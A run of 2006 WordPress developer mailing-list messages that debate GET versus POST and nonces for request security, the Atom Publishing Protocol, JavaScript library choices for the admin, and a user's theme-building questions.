Message-ID: <444A7EFB.5090807@metalab.unc.edu>

Denis de Bernardy wrote:

> Mm... Let's see your implementation of the secure hash algorithms in Brainfuck or XSLT. Both are Turing complete as well, and it really wouldn't be all that hard to implement. A simple matter of coding and testing.

I could absolutely do it in XSLT. That might make a nice paper for 
Extreme next year. I was planning an XSLT Suduko solver, but someone 
beat me to that. but you'll have to find some else for the Brainfuck 
port. :-)

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From jjb at ibiblio.org  Sat Apr 22 19:40:22 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Sat Apr 22 19:44:33 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444A7E37.6000906@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
Message-ID: <Pine.LNX.4.61.0604221539190.32699@tribal.metalab.unc.edu>


On Sat, 22 Apr 2006, Elliotte Harold wrote:

> Within a year, APP is going to be a sine qua non for blog publishing; and 
> that's totally dependent on a proper implementation of GET, POST, PUT, and 
> DELETE. The more right WordPress gets with HTTP now the easier it's going to 
> be to support APP in the near future. Of course WordPress doesn't have to 
> support APP. It doesn't even support Atom 1.0 yet. But if that's the road it 
> takes, users are going to jump ship no matter how pretty the UI looks. They 
> won't even see the UI most of the time, because they'll be editing in a rich 
> client application that requires APP on the server.

What's APP? (i could't find it on wikipedia, therefore, it does not exist. 
q.e.d.)


John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/

From peter.westwood at ftwr.co.uk  Sat Apr 22 19:45:58 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat Apr 22 19:50:52 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <Pine.LNX.4.61.0604221539190.32699@tribal.metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>
	<Pine.LNX.4.61.0604221539190.32699@tribal.metalab.unc.edu>
Message-ID: <444A87F6.3090303@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

John Joseph Bachir wrote:
> 
> On Sat, 22 Apr 2006, Elliotte Harold wrote:
> 
>> Within a year, APP is going to be a sine qua non for blog publishing;
>> and that's totally dependent on a proper implementation of GET, POST,
>> PUT, and DELETE. The more right WordPress gets with HTTP now the
>> easier it's going to be to support APP in the near future. Of course
>> WordPress doesn't have to support APP. It doesn't even support Atom
>> 1.0 yet. But if that's the road it takes, users are going to jump ship
>> no matter how pretty the UI looks. They won't even see the UI most of
>> the time, because they'll be editing in a rich client application that
>> requires APP on the server.
> 
> What's APP? (i could't find it on wikipedia, therefore, it does not
> exist. q.e.d.)

I believe he means Atom Publishing Protocol [1,2]

At least thats all i could find that made sense in the context of his mail.

[1] http://www.ietf.org/html.charters/atompub-charter.html
[2] http://www.ietf.org/internet-drafts/draft-ietf-atompub-protocol-08.txt

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFESof2VPRdzag0AcURAt7pAJ9CjxETKmIFH5w9B/znNupyEO2gKgCfXhTw
hvZtb1e4WMzlEyabkfNDQMg=
=7FgA
-----END PGP SIGNATURE-----

From ryan at boren.nu  Sat Apr 22 20:57:18 2006
From: ryan at boren.nu (Ryan Boren)
Date: Sat Apr 22 21:06:14 2006
Subject: [wp-hackers] Re: [wp-svn] [3749] trunk/wp-admin: Remove those
	naughty flushes.
In-Reply-To: <7235ce780604220315odf55ea7w7454f760e2e3e2fb@mail.gmail.com>
References: <200604220210.k3M2AjF5045693@comox.textdrive.com>
	<7235ce780604220315odf55ea7w7454f760e2e3e2fb@mail.gmail.com>
Message-ID: <444A98AE.7050509@boren.nu>

Mike Little wrote:
> On 4/22/06, m@wordpress.org <m@wordpress.org> wrote:
> 
>> Revision 3749 Author ryan Date 2006-04-22 02:10:42 +0000 (Sat, 22 Apr 2006)
>>Log Message Remove those naughty flushes.
>>
> 
> 
> Why?
> Don't they prevent timeouts (and give valuable feedback) on really
> large imports?

They were screwing up plugins that manipulated the output buffer, 
leading lots of bug reports.  There's probably a better way to deal with 
it, but I just removed them for now.

Ryan
From m at mullenweg.com  Sat Apr 22 21:13:32 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Sat Apr 22 21:17:45 2006
Subject: [wp-hackers] POST vs. THE WORLD
In-Reply-To: <444A7E37.6000906@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
Message-ID: <444A9C7C.5020006@mullenweg.com>

Elliotte Harold wrote:
> This is a not a little part of the HTTP standard. It is a major part of 
> the foundation. Throwing away the side-effect free nature of GET is like 
>  throwing away natural selection in biology. It's that critical.

Most apps on the web break this, and they seem to be doing fine. As are we.

> It's not simply a question of security. There are other bugs and 
> problems waiting to bite. Caches, load balancers, web accelerators, and 
> more all depend on the side-effect free nature of GET.

No they don't. When they don't recognize how GET is used outside of 
ivory towers, there has been a huge outcry and they've been fixed, as 
with the Google Web Accelerator.

> Oh, one more thing: there is one major development barreling down the 
> road getting ready to smack WordPress's current architecture upside the 
> head. Within a year, APP is going to be a sine qua non for blog 
> publishing; and that's totally dependent on a proper implementation of 
> GET, POST, PUT, and DELETE.

Something I think will hinder its adoption, if it remains so enamored 
with HTTP verbs. There was recently a discussion about relaxing the 
restrictions to allow most APP functionality through POST, though I 
didn't follow where that ended up.

(Tangent.) There has been a disturbing disconnect the past year or so 
between the real world and people writing standards and languages. 
Trading convenience and backward compatibility for academic perfection 
is the reason things like PHP5 and XHTML 1.1 have been abject failures 
in the marketplace. (Single-digit adoption rates.)

> The more right WordPress gets with HTTP now 
> the easier it's going to be to support APP in the near future.

I don't see any connection.

BTW, it has already been demonstrated that switching everything to POST 
would not solve the problem as completely as secure nonces would as you 
can still cross-domain submit forms. Therefore it would be a lot of work 
that would, at best, please a few pedants and bring us into SHOULD 
compliance with a 7+ year old standard no one else supports either.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From mike at zed1.com  Sat Apr 22 21:43:48 2006
From: mike at zed1.com (Mike Little)
Date: Sat Apr 22 21:47:55 2006
Subject: [wp-hackers] Re: [wp-svn] [3749] trunk/wp-admin: Remove those
	naughty flushes.
In-Reply-To: <444A98AE.7050509@boren.nu>
References: <200604220210.k3M2AjF5045693@comox.textdrive.com>
	<7235ce780604220315odf55ea7w7454f760e2e3e2fb@mail.gmail.com>
	<444A98AE.7050509@boren.nu>
Message-ID: <7235ce780604221443s17884667hafadb43c164a9748@mail.gmail.com>

On 4/22/06, Ryan Boren <ryan@boren.nu> wrote:
> Mike Little wrote:
> > Why?
> > Don't they prevent timeouts (and give valuable feedback) on really
> > large imports?
>
> They were screwing up plugins that manipulated the output buffer,
> leading lots of bug reports.  There's probably a better way to deal with
> it, but I just removed them for now.
>
> Ryan

Ah right! OK, that makes sense.

Which reminds me I found, and fixed, an MT import bug. I'll raise it
on trac and prepare a patch.


Mike
--
Mike Little
http://zed1.com/
From elharo at metalab.unc.edu  Sun Apr 23 12:17:07 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Sun Apr 23 12:21:52 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444A87F6.3090303@ftwr.co.uk>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<Pine.LNX.4.61.0604221539190.32699@tribal.metalab.unc.edu>
	<444A87F6.3090303@ftwr.co.uk>
Message-ID: <444B7043.8090905@metalab.unc.edu>

Peter Westwood wrote:

> I believe he means Atom Publishing Protocol [1,2]
> 

Correct. Sorry. My bad. I should have spelled that out.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From ringmaster at midnightcircus.com  Sun Apr 23 12:59:25 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sun Apr 23 13:03:51 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444A7E37.6000906@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
Message-ID: <444B7A2D.1060402@midnightcircus.com>

Elliotte Harold wrote:
> I am not at all convinced that the proposed fix will work. 

You are welcome to produce code that you feel will work better.

WordPress has always been a "put up or shut up" environment.  If you 
feel that you can produce more satisfying code for the WordPress 
userbase, we'll adopt it when when that proves to be true.

I think your mission is folly, but who knows?  Users might actually 
enjoy crappy-looking UI if you are able to explain to them why it's 
better, though you're not doing much convincing here.

All of this academic discussion at the expense of productivity is a 
bore.  I think people understand the issues pretty well now.  Let's move on.

Owen
From ryan at concept64.com  Sun Apr 23 13:32:53 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Sun Apr 23 13:37:03 2006
Subject: [wp-hackers] AJAX / JS libraries
Message-ID: <444B8205.8070200@concept64.com>

Hey all,

With all the new AJAXy goodness and various Javascript tools and scripts 
going into WP Admin 2.1, I feel as though adding a JS toolkit as a basis 
for these JS calls might benefit plugin writers and also 
consolidate/replace a lot of the JS scripts floating around.

I just read ringmaster's comments on Ticket #2654:

    If you're looking to implement something with Ajax, here's an idea:

    Ditch tw-sack (No error handling/debugging? Can't handle equals
    signs as passed values with the standard functions?) and build a
    WP-pluggable ajax library. Move all of the floating PHP functions
    that respond to the various ajax requests into a single file that
    dispatches those requests to plugin hooks. Include some way to hook
    client-side events to server-side code on-demand so that things like
    this can be customized by plugins.

No offense to whomever wrote all this wonderful AJAX and list management 
code, but I fear the maintainability and extensibility of all this is 
going to become a problem in future releases.  And if more AJAX is 
planned for the future, I do think having a strong toolkit to build off 
would be beneficial.  The phrase "don't reinvent the wheel" keeps coming 
to mind.  Let the toolkit worry about handling cross-browser 
compatibility, etc...

I don't know, maybe this has been discussed before or maybe the decision 
was just made by those implementing it...  but for the sake of creating 
an extensible and maintainable product that is now AJAX and JS friendly, 
I think it should be considered.

Personally, I recommend Prototype.  http://prototype.conio.net/  It's 
being used by the Widgets plugin and all the major applications running 
Ruby on Rails (see any 37 Signals product), and I don't think it's 
support is going to go away anytime soon.  And if you've ever seen 
anything written using it, the JS code is beautiful and simple and it 
works.  And adding Scriptaculous effects or tools becomes even easier.

Maybe file size is a concern?  Prototype serves at 12KB with gzip 
compression and caches.

I'm not trying to start some major political debate, I'm just curious 
what everyone's thoughts are on this matter.  If it's been discussed 
before, link me, please.  :-)

Sincerely,

Ryan Scheuermann

-- 
----
Concept 64, Inc. | Phone: 610.349.0703 | Web: www.concept64.com

From theodor_ramisch at hotmail.com  Sun Apr 23 18:24:37 2006
From: theodor_ramisch at hotmail.com (Theodor Ramisch)
Date: Sun Apr 23 18:29:11 2006
Subject: [wp-hackers] AJAX / JS libraries
References: <444B8205.8070200@concept64.com>
Message-ID: <BAY109-DAV2D4E36E733A64A138962590B90@phx.gbl>

Hi,
> I'm not trying to start some major political debate, I'm just curious 
> what everyone's thoughts are on this matter.  If it's been discussed 
> before, link me, please.  :-)

I mentioned this some months ago, see 
http://comox.textdrive.com/pipermail/wp-hackers/2005-November/thread.html#3311
It wasn't really discussed, but one answer was that WordPress avoids
the use of public libraries due to security reasons.

Theodor
From r at robm.me.uk  Sun Apr 23 18:28:10 2006
From: r at robm.me.uk (Rob)
Date: Sun Apr 23 18:29:42 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <444B8205.8070200@concept64.com>
References: <444B8205.8070200@concept64.com>
Message-ID: <444BC73A.9060607@robm.me.uk>

Definitely agree. I've wanted to use Scriptaculous in a number of 
plugins, but it seems a bit wasteful (in terms of space and bandwidth) 
to distribute it separately with each of them when it could so easily 
(and benficially!) be centralised -and used - in the core code.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From dmhouse at gmail.com  Sun Apr 23 18:42:45 2006
From: dmhouse at gmail.com (David House)
Date: Sun Apr 23 18:46:53 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <BAY109-DAV2D4E36E733A64A138962590B90@phx.gbl>
References: <444B8205.8070200@concept64.com>
	<BAY109-DAV2D4E36E733A64A138962590B90@phx.gbl>
Message-ID: <ebe43d680604231142u25aed804y5184e7d07f3bbb53@mail.gmail.com>

On 23/04/06, Theodor Ramisch <theodor_ramisch@hotmail.com> wrote:
> I mentioned this some months ago, see
> http://comox.textdrive.com/pipermail/wp-hackers/2005-November/thread.html#3311
> It wasn't really discussed, but one answer was that WordPress avoids
> the use of public libraries due to security reasons.

I wouldn't say that. At the moment we use:

* IXR (xmlrpc interface)
* Snoopy (remote URL fetcher)
* Magpie (RSS parser)
* Gettext (i10n)
* DBX (fancy moving boxes in admin)
* tx_sack (ajax)
* tinyMCE (wysiwyg)
* KSES (filtering dangerous tags in posts)
* ezSQL (DB interaction)

That's a fair share of external libraries, and I've probably missed some.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From Molly.Lavik at Verizon.net  Sun Apr 23 18:52:55 2006
From: Molly.Lavik at Verizon.net (Molly Lavik)
Date: Sun Apr 23 18:57:11 2006
Subject: [wp-hackers] Questions for Unveiling Wordpress Template Site at
 International Conference This Week
Message-ID: <003301c66707$220c6ef0$6500a8c0@1ECA66A679AB494>

Hi,

I'm in the process of unveiling a website that is created by programming a
new template for Wordpress. I've hired a knowledgeable program developer who
is using Wordpress for the first time and we have some questions.

 

1)     We are having challenges programming rounded corners for the boxes on
all but the homepage of the Wordpress template design. Does anyone have a
suggestion on how to fix this?

2)     The automated categories listing is only working on the main page.
Does anyone have a suggestion on how to fix this?

3)     The Wordpress site looks good when viewed from an Explorer browser
but much of the programming is lost when viewed from a Firefox and Netscape
browser. In particular all of our flash programming of the photos and a
proprietary audio player that is a flash player do not work currently when
viewed from Firefox and Netscape browsers. Does anyone have any advice on
how to fix this?

4)     The Wordpress site looks good when viewed on a PC but when viewed
from a Mac the design is greatly elongated and does not look good. Does
anyone have a suggestion on how to fix this? 

5)     We are not entirely sure we have the right text for the
acknowledgement of using Wordpress as an open source platform embedded in
our programming for the modified and templated Wordpress pages. The general
text we plan to use is as follows. Please let me know if you think this is
the appropriate text or if we are leaving something out. Any examples of
good text for this purpose would be greatly appreciated. 

 

*/Copyright 2006 [My company name is inserted here]/*

*/[My e-mail address is listed here]/*

*/The program is distributed under the terms of the <a href=[The site
<http://www.startuptime.com/wpblog/license.txt> 's URL address is listed
here]/license.txt>GNU General Public License</a>./*

 

*/This file is part of WordPress./*
*/This file was modified on 03-31-06./*
 
*/WordPress is free software; you can redistribute it and/or modify /*
*/it under the terms of the GNU General Public License as published by/*
*/the Free Software Foundation; either version 2 of the License, or/*
*/ (at your option) any later version. /*
 
*/WordPress is distributed in the hope that it will be useful, /*
*/but WITHOUT ANY WARRANTY; without even the implied warranty of/*
*/MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the/*
*/GNU General Public License for more details. /*
 
*/You should have received a copy of the GNU General Public License/*
*/along with WordPress; if not, write to the Free Software/*
*/Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301
USA/*
 
Thank you in advance for any suggestions, examples or lessons learned you
can share with me on any of the above five questions. Please know I'm
grateful for your assistance.
 
Wishing you all the best,

Sunrise

 

 

From skeltoac at gmail.com  Sun Apr 23 20:55:56 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sun Apr 23 21:00:08 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <444B8205.8070200@concept64.com>
References: <444B8205.8070200@concept64.com>
Message-ID: <e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>

On 4/23/06, Ryan Scheuermann <ryan@concept64.com> wrote:
> Personally, I recommend Prototype.  http://prototype.conio.net/  It's
> being used by the Widgets plugin and all the major applications running
> Ruby on Rails (see any 37 Signals product), and I don't think it's
> support is going to go away anytime soon.  And if you've ever seen
> anything written using it, the JS code is beautiful and simple and it
> works.

Why thank you! You're really too kind ;-)

Yeah, I'd love to start using Prototype and Scriptaculous in more
places in the admin and even have it available to themes. Getting rid
of Sack would be great.

We ought to have a set of core PHP functions to handle javascript
includes. Sort of like a wrapper for
add_action(is_admin()?'admin_head':'wp_head', $callback) where
$callback cannot be registered twice and known dependencies can be
handled (e.g. if Scriptaculous, include Prototype).

Another possibility is to write a gzip compressor that concatenates
all of the requested js libraries and compresses them. This would
reduce bandwidth in most cases.
script src="wp-includes/js/wp_js.php?prototype+scriptaculous"

Caveat: each combination of libraries would be downloaded and cached
without regard for the desired script already having been downloaded
in another combination.

Anybody interested in doing this for 2.1?

Andy
From ringmaster at midnightcircus.com  Sun Apr 23 21:06:12 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sun Apr 23 21:10:48 2006
Subject: [wp-hackers] Questions for Unveiling Wordpress Template Site at
	International Conference This Week
In-Reply-To: <003301c66707$220c6ef0$6500a8c0@1ECA66A679AB494>
References: <003301c66707$220c6ef0$6500a8c0@1ECA66A679AB494>
Message-ID: <444BEC44.3040806@midnightcircus.com>

Molly Lavik wrote:
> I'm in the process of unveiling a website that is created by programming a
> new template for Wordpress. I've hired a knowledgeable program developer who
> is using Wordpress for the first time and we have some questions.

Is there a [wp-designs] list for theme developers?  Should there be, or 
does http://wordpress.org/support cover all that?

(Info about wp-hackers vs. support sent under different heading.)

Owen
From false.hopes at gmail.com  Sun Apr 23 21:07:08 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sun Apr 23 21:11:17 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>
References: <444B8205.8070200@concept64.com>
	<e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>
Message-ID: <a491f91d0604231407i3352243fkbfda6f8fa79a94e8@mail.gmail.com>

On 4/23/06, Andy Skelton <skeltoac@gmail.com> wrote:
> Yeah, I'd love to start using Prototype and Scriptaculous in more
> places in the admin and even have it available to themes. Getting rid
> of Sack would be great.

+1 on prototype and the removal of sack

I'm iffy on the thought of Scriptaculous. Scriptaculous is relatively
huge, and after the addition of TinyMCE I'm not sure if we should be
willing to add another huge chunk of javascript. I personally would
like to see something like moo.fx, which is beautiful and tiny (3KB)

> We ought to have a set of core PHP functions to handle javascript
> includes. Sort of like a wrapper for
> add_action(is_admin()?'admin_head':'wp_head', $callback) where
> $callback cannot be registered twice and known dependencies can be
> handled (e.g. if Scriptaculous, include Prototype).

+1

> Another possibility is to write a gzip compressor that concatenates
> all of the requested js libraries and compresses them. This would
> reduce bandwidth in most cases.
> script src="wp-includes/js/wp_js.php?prototype+scriptaculous"

-1, because of the following caveat

> Caveat: each combination of libraries would be downloaded and cached
> without regard for the desired script already having been downloaded
> in another combination.

--
--Robert Deaton
http://somethingunpredictable.com
From podz at tamba2.org.uk  Sun Apr 23 21:16:38 2006
From: podz at tamba2.org.uk (Podz)
Date: Sun Apr 23 21:20:51 2006
Subject: [wp-hackers] Questions for Unveiling Wordpress Template Site
	at	International Conference This Week
In-Reply-To: <444BEC44.3040806@midnightcircus.com>
References: <003301c66707$220c6ef0$6500a8c0@1ECA66A679AB494>
	<444BEC44.3040806@midnightcircus.com>
Message-ID: <444BEEB6.4070801@tamba2.org.uk>

Owen Winkler wrote:
> Molly Lavik wrote:
>> I'm in the process of unveiling a website that is created by 
>> programming a
>> new template for Wordpress. I've hired a knowledgeable program 
>> developer who
>> is using Wordpress for the first time and we have some questions.
> 
> Is there a [wp-designs] list for theme developers?  Should there be, or 
> does http://wordpress.org/support cover all that?

Support would cover that ....though Codex might be the place for a 
'knowledgeable program developer'..
Given the wording so far, and the title of this post I would expect the 
person to do this all on their own - but that's just me.

P.
From skeltoac at gmail.com  Sun Apr 23 21:39:25 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sun Apr 23 21:43:34 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <a491f91d0604231407i3352243fkbfda6f8fa79a94e8@mail.gmail.com>
References: <444B8205.8070200@concept64.com>
	<e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>
	<a491f91d0604231407i3352243fkbfda6f8fa79a94e8@mail.gmail.com>
Message-ID: <e6ec604d0604231439t6fc3e385u15a3085d30efb2ed@mail.gmail.com>

On 4/23/06, Robert Deaton <false.hopes@gmail.com> wrote:
> I'm iffy on the thought of Scriptaculous. Scriptaculous is relatively
> huge, and after the addition of TinyMCE I'm not sure if we should be
> willing to add another huge chunk of javascript. I personally would
> like to see something like moo.fx, which is beautiful and tiny (3KB)

Scriptaculous isn't going to be necessary. When Brothercake's dbx [1]
is updated with the things I need for Widgets, I'll probably stop
using Scriptaculous. In combination with your suggestion of moo.fx [2]
I think we'd have enough features to drop Scriptaculous.

I actually had a blind guy who blogs about braille ask me how to move
the widgets without a mouse. Brothercake's scripts are 100% keyboard
accessible.

Andy

[1] http://www.brothercake.com/site/resources/scripts/dbx/
[2] http://moofx.mad4milk.net/
From lists at viper007bond.com  Mon Apr 24 00:05:29 2006
From: lists at viper007bond.com (Viper007Bond)
Date: Mon Apr 24 00:09:37 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <e6ec604d0604231439t6fc3e385u15a3085d30efb2ed@mail.gmail.com>
References: <444B8205.8070200@concept64.com>	<e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>	<a491f91d0604231407i3352243fkbfda6f8fa79a94e8@mail.gmail.com>
	<e6ec604d0604231439t6fc3e385u15a3085d30efb2ed@mail.gmail.com>
Message-ID: <444C1649.3010309@viper007bond.com>

Yeah, I was going to suggest moo.fx as well. It's WAY lighter and has 
all the basic stuff you need without the bloat of stuff you don't.

However, if we do go with a larger package, I'd like to see it split up 
into smaller files. That way a plugin / admin page / whatever can just 
call the bits it needs (say AJAX or collapse/expand) rather than the 
whole, huge ass script.

-Viper

Andy Skelton wrote:
> On 4/23/06, Robert Deaton <false.hopes@gmail.com> wrote:
>> I'm iffy on the thought of Scriptaculous. Scriptaculous is relatively
>> huge, and after the addition of TinyMCE I'm not sure if we should be
>> willing to add another huge chunk of javascript. I personally would
>> like to see something like moo.fx, which is beautiful and tiny (3KB)
> 
> Scriptaculous isn't going to be necessary. When Brothercake's dbx [1]
> is updated with the things I need for Widgets, I'll probably stop
> using Scriptaculous. In combination with your suggestion of moo.fx [2]
> I think we'd have enough features to drop Scriptaculous.
> 
> I actually had a blind guy who blogs about braille ask me how to move
> the widgets without a mouse. Brothercake's scripts are 100% keyboard
> accessible.
> 
> Andy
> 
> [1] http://www.brothercake.com/site/resources/scripts/dbx/
> [2] http://moofx.mad4milk.net/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
From leftjustified at gmail.com  Mon Apr 24 00:25:36 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Mon Apr 24 00:29:44 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <e6ec604d0604231439t6fc3e385u15a3085d30efb2ed@mail.gmail.com>
References: <444B8205.8070200@concept64.com>
	<e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>
	<a491f91d0604231407i3352243fkbfda6f8fa79a94e8@mail.gmail.com>
	<e6ec604d0604231439t6fc3e385u15a3085d30efb2ed@mail.gmail.com>
Message-ID: <6453a6e90604231725l6d785abbq1cb63993150a97de@mail.gmail.com>

+1 Prototype in core
+1 moo.fx in core

On 4/24/06, Andy Skelton <skeltoac@gmail.com> wrote:
> I actually had a blind guy who blogs about braille ask me how to move
> the widgets without a mouse. Brothercake's scripts are 100% keyboard
> accessible.

James(brothercake) works _extremely_ hard on the accessibility of his
javascript. I would very much like to see the example set by his DBX
script followed by any other JS powered features to be included in WP
core. I have access to a wide array of assistive technologies  and am
happy to help with testing, but it is more important that developers
who are writing these new JS features make themselves aware of the
issues faced by dissabled users _before_ implementing said features :)

Andrew.
From skeltoac at gmail.com  Mon Apr 24 01:07:09 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Apr 24 01:11:18 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <6453a6e90604231725l6d785abbq1cb63993150a97de@mail.gmail.com>
References: <444B8205.8070200@concept64.com>
	<e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>
	<a491f91d0604231407i3352243fkbfda6f8fa79a94e8@mail.gmail.com>
	<e6ec604d0604231439t6fc3e385u15a3085d30efb2ed@mail.gmail.com>
	<6453a6e90604231725l6d785abbq1cb63993150a97de@mail.gmail.com>
Message-ID: <e6ec604d0604231807r27739d89jc14565c50ed72754@mail.gmail.com>

On 4/23/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> [...] it is more important that developers
> who are writing these new JS features make themselves aware of the
> issues faced by dissabled users _before_ implementing said features :)

The issues were fully known when the Widgets plugin was developed and
released. There did not exist any keyboard-accessible libraries that
did what I required, so I went ahead with something that works for
most people. I blogged the feature request, emailed James and even
spoke with him in person about the need. When he has released a stable
version that does what we require, it will replace Scriptaculous in
the Widgets plugin.

The blind user I mentioned does have a working interface for moving
and adjusting his widgets: he can email me. It's slower but it works
and he's happy with it.

Not that I need to defend Widgets from anyone, but I want to convey
that the lack of a 100% accessible tool should not be used to stop
development.

Andy
From leftjustified at gmail.com  Mon Apr 24 01:56:23 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Mon Apr 24 02:00:31 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444B7A2D.1060402@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
Message-ID: <6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>

On 4/23/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> Users might actually enjoy crappy-looking UI if you are able to explain to them why it's
> better, though you're not doing much convincing here.

The "ugly UI" reason for avoiding POST is as silly as the "MD5 vs.
dictionary" reason for wanting to use a more processor intensive hash
for nonces.

form.btn {display:inline}

Done. Can we move away from that excuse now or am I going to have to
do a full html mockup with <input>s inplace of all action-performing
links to prove my point?

I'm not siding with anyone here regarding GET vs. POST, merely
pointing out this UI excuse is lame. All modern browsers now support
styling of form elements (even Safari and Opera; though they're user
options) and regardless, a standard HTML form button is just a text
string with a border and background... it's not the end of the world
people! :P

-Andrew
From skeltoac at gmail.com  Mon Apr 24 05:06:26 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Apr 24 05:11:04 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
Message-ID: <e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>

On 4/23/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> Done. Can we move away from that excuse now or am I going to have to
